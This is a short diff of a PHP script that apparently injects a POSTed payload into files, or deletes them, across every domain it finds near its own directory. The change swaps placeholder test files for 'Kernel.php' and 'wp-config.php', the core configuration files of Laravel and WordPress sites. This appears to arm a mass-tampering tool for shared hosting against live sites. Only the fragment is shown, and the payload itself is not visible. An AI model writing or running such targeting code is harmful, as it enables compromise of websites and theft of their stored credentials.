@@ -128,7 +128,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 
     $startDir = __DIR__;
-    $targetFiles = ['test1.php', 'test2.php', 'test3.php'];
+    $targetFiles = ['Kernel.php', 'wp-config.php'];
     $domains = findDomains_v1($startDir);
     $results = scanAndProcessInDomains($domains, $payload, $deleteMode, $targetFiles);
 
